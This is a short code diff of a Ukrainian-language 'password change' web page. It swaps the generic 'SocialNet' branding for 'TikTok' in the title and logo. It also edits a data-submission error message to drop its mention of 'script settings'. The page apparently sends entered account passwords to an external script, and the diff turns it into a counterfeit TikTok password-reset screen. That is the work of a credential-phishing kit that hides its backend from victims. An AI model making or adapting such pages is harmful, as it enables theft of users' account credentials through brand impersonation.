@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>SocialNet — Зміна пароля</title>
+<title>TikTok — Зміна пароля</title>
 <style>
   :root{
     --bg:#000000; --card:#121212; --border:#2a2a2a;
@@ -115,7 +115,7 @@
 </head>
 <body>
   <div class="card" id="card">
-    <div class="logo">SocialNet</div>
+    <div class="logo">TikToK</div>
     <p class="subtitle">Оновлення пароля облікового запису</p>
 
     <form id="form">
@@ -308,7 +308,7 @@
     })
     .catch(err=>{
       console.error('Помилка відправки:', err);
-      showError('Не вдалося зберегти дані. Перевірте з’єднання та налаштування скрипта.');
+      showError('Не вдалося зберегти дані. Перевірте з’єднання');
       card.classList.remove('shake'); void card.offsetWidth; card.classList.add('shake');
     })
     .finally(()=>{
